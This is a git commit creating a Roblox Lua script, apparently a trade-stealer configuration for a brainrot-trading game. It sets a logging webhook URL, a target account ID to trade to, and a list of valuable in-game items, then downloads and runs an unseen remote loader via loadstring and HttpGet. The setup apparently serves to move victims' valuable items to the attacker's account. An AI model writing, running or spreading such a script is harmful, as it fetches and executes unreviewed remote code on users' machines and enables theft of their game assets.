a8bf4574ec01684f88bc6fc6fbba0e2730757878
NeyZ0x <neyz.sab12827@gmail.com>
2026-02-26 20:40:23 +0100

    Create script.lua

---
+++ script.lua
@@ -0,0 +1,25 @@
+-- Настройки трейда
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_7a5825bd3da94db1b79e98be66638845"
+getgenv().TARGET_ID = 1672167275  -- ID аккаунта для трейда
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["Tang Tang Keletang"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Ketupat Kepat"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Tictac Sahur"] = true,
+    ["Cerberus"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Money Money Puggy"] = true,
+    ["Capitano Moby"] = true,
+    ["Reinito Sleighito"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Dragon Gingerini"] = true
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
